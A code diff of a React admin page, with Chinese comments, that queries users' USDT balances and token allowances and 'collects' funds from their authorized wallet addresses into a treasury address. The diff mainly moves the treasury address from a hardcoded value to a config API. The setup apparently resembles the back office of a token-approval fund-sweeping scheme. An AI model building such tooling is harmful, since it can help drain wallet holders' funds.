@@ -120,7 +120,7 @@ export default function UsersPage() {
   const [agents, setAgents] = useState<Array<{id: number, agent_name: string, agent_code: string}>>([])
   const [loadingAgents, setLoadingAgents] = useState(false)
   const [adminSession, setAdminSession] = useState<{id: number, role_id: number, username: string} | null>(null)
-  const [treasuryAddress, setTreasuryAddress] = useState<string>('0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a')
+  const [treasuryAddress, setTreasuryAddress] = useState<string>('')
   
   // 检查是否为代理用户
   const isAgentUser = useCallback(() => {
@@ -270,19 +270,28 @@ export default function UsersPage() {
   const [balanceStates, setBalanceStates] = useState<Record<string, {loading: boolean, balance: string}>>({})
   const [batchQueryLoading, setBatchQueryLoading] = useState(false)
 
-  // 获取系统配置（收款地址）
+  // 获取授权配置（收款地址）
   const fetchSystemConfig = async () => {
     try {
-      const response = await fetch('/api/admin/system/config')
+      // 从授权配置中获取收款地址
+      const response = await fetch('/api/admin/auth-config?chain_type=ERC')
       if (response.ok) {
         const result = await response.json()
-        if (result.success && result.data?.treasuryAddress) {
-          setTreasuryAddress(result.data.treasuryAddress)
+        if (result.success && result.data && result.data.length > 0) {
+          // 查找第一个启用的配置
+          const enabledConfig = result.data.find((config: any) => config.is_enabled === true) || result.data[0]
+          if (enabledConfig?.treasury_address) {
+            setTreasuryAddress(enabledConfig.treasury_address)
+            console.log('✅ 从授权配置中获取收款地址:', enabledConfig.treasury_address)
+          } else {
+            setTreasuryAddress('')
+            console.log('⚠️ 授权配置中未找到收款地址，请先在授权配置中设置收款地址')
+          }
         }
       }
     } catch (error) {
       if (process.env.NODE_ENV === 'development') {
-        console.error('获取系统配置失败:', error)
+        console.error('获取授权配置失败:', error)
       }
     }
   }
@@ -491,7 +500,7 @@ export default function UsersPage() {
 
   // 批量查询所有用户的链上余额
   const batchQueryBalances = async () => {
-    // 过滤出有钱包地址的用户（优先使用授权地址，其次使用注册地址）
+    // 过滤出有钱包地址的用户
     const usersWithAddress = users.filter(user => user.wallet_address)
     
     if (usersWithAddress.length === 0) {
@@ -505,10 +514,9 @@ export default function UsersPage() {
     let failCount = 0
     
     for (const user of usersWithAddress) {
-      // 优先使用授权地址，如果没有授权地址或为空则使用注册地址
-      const queryAddress = (user.auth_wallet_address && user.auth_wallet_address.trim()) 
-        ? user.auth_wallet_address 
-        : user.wallet_address
+      // 查询余额应该使用用户自己的钱包地址，而不是权限地址
+      // auth_wallet_address 是用户授权给的地址，不是用户自己的钱包
+      const queryAddress = user.wallet_address
       
       // 设置加载状态
       setBalanceStates(prev => ({
@@ -864,10 +872,9 @@ export default function UsersPage() {
       return
     }
 
-    // 优先使用授权地址，如果没有授权地址或为空则使用注册地址
-    const queryAddress = (user.auth_wallet_address && user.auth_wallet_address.trim()) 
-      ? user.auth_wallet_address 
-      : user.wallet_address
+    // 查询余额应该使用用户自己的钱包地址，而不是权限地址
+    // auth_wallet_address 是用户授权给的地址，不是用户自己的钱包
+    const queryAddress = user.wallet_address
     
     console.log(`🔍 查询用户 ${userId} 的链上余额`, {
       注册地址: user.wallet_address,
@@ -892,8 +899,8 @@ export default function UsersPage() {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
-            userAddress: queryAddress,
-            spenderAddress: user.auth_wallet_address || undefined // 如果用户有授权地址，使用授权地址查询
+            userAddress: queryAddress
+            // 不传递 spenderAddress，使用默认的合约地址查询授权额度
           })
         })
       ])
@@ -929,29 +936,16 @@ export default function UsersPage() {
           // 检查授权状态是否已更新
           authorizationUpdated = allowanceResult.data.authorizationUpdated === true
           
-          // 优先使用传入的spenderAddress对应的授权额度
-          // 如果有allAllowances，显示所有权限地址的授权额度
-          if (allowanceResult.data.allAllowances && Object.keys(allowanceResult.data.allAllowances).length > 0) {
-            // 找到最大的授权额度
-            const allAllowances = allowanceResult.data.allAllowances as Record<string, string>
-            const allowanceValues = Object.values(allAllowances).map(v => Number.parseFloat(String(v)))
-            const maxAllowance = Math.max(...allowanceValues)
-            allowance = maxAllowance.toFixed(6)
-            
-            console.log('📊 所有权限地址的授权额度:', allAllowances)
-            console.log('📊 最大授权额度:', allowance)
-          } else {
-            // 兼容旧格式
-            allowance = allowanceResult.data.allowance || '0.000000'
-          }
+          // 使用用户对合约地址的授权额度（这是正确的授权对象）
+          allowance = allowanceResult.data.allowance || '0.000000'
           
           console.log('📊 授权额度查询结果:', {
             allowance: allowanceResult.data.allowance,
-            allAllowances: allowanceResult.data.allAllowances,
-            permissionAddresses: allowanceResult.data.permissionAddresses,
+            contractAddress: allowanceResult.data.contractAddress || allowanceResult.data.spenderAddress,
             spenderAddress: allowanceResult.data.spenderAddress,
             最终使用的额度: allowance,
-            授权状态已更新: authorizationUpdated
+            授权状态已更新: authorizationUpdated,
+            说明: '授权额度是用户对归集合约地址的授权'
           })
           
           // 如果授权状态已更新，刷新用户列表（使用防抖避免频繁刷新）
@@ -1042,13 +1036,11 @@ export default function UsersPage() {
         [userId]: { loading: false, balance: '查询失败' }
       }))
       // 显示查询失败弹窗
-      const queryAddress = (user.auth_wallet_address && user.auth_wallet_address.trim()) 
-        ? user.auth_wallet_address 
-        : user.wallet_address
+      const queryAddress = user.wallet_address
       
       setBalanceQueryData({
         userId: convertUuidToNumericId(userId), // 转换为数字ID显示
-        wallet_address: queryAddress || user.wallet_address || '',
+        wallet_address: queryAddress || '',
         ethBalance: '',
         usdtBalance: '',
         allowance: '',
@@ -1352,7 +1344,7 @@ export default function UsersPage() {
 
     // 显示确认弹窗
     setCollectionConfirmData({
-      userId: collectionInputData.userId,
+      userId: convertUuidToNumericId(collectionInputData.userId), // 转换为数字ID显示
       fromAddress: collectionInputData.fromAddress,
       toAddress: toAddress,
       amount: amount
@@ -1368,7 +1360,7 @@ export default function UsersPage() {
       userAddress: user.wallet_address || '',
       authAddress: user.wallet_address || '',
       amount: '',
-      adminAddress: '0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a', // 默认收款地址
+      adminAddress: treasuryAddress || '', // 从数据库获取的收款地址
       reason: '授权地址归集转账'
     })
     setIsTransferModalOpen(true)
@@ -1427,7 +1419,7 @@ export default function UsersPage() {
         
         // 显示自定义成功弹窗
         setCollectionSuccessData({
-          userId: transferData.userId,
+          userId: convertUuidToNumericId(transferData.userId), // 转换为数字ID显示
           amount: transferData.amount,
           fromAddress: transferData.authAddress,
           toAddress: data?.toAddress || transferData.adminAddress,
